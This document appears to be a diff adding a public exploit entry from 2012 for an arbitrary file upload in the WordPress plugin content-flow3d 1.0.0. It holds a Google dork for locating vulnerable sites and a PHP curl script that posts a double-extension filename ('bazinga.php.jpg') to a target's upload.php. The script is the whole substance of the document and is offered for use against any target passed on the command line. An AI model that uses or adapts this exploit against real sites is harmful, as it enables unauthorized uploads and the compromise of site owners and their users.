@@ -1,0 +1,45 @@
+# Exploit Title: Wordpress content-flow3d Arbitrary File Upload 
+# Google Dork: inurl:plugins/content-flow3d/
+# Date: 10June2012
+# Exploit Author: g11tch
+# Vendor Homepage: http://wordpress.org/extend/plugins/content-flow3d/
+# Software Link: downloads.wordpress.org/plugin/content-flow3d.zip
+# Version: 1.0.0
+# Tested on: CentOS, Ubuntu Server 11.04
+
+Greets in no particular order
+pfizer.inc   for the constant motivation
+pr1me, The_Eccentric, Spridel, Hackett, DrB0n3z, 
+merci Sammy Forgit pour l'expression correcte
+###############################################
+
+#!/usr/bin/php -f
+<?php
+#
+# upload.php curl exploit
+#
+//
+// HTTP FILES,
+//
+
+$target = $argv[1];
+
+$postData = array();
+$postData[ 'qqfile' ] = "bazinga.php.jpg";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch, CURLOPT_URL, "http://$target/upload.php");
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postData );
+curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
+curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
+curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+
+echo $buf;
+?>
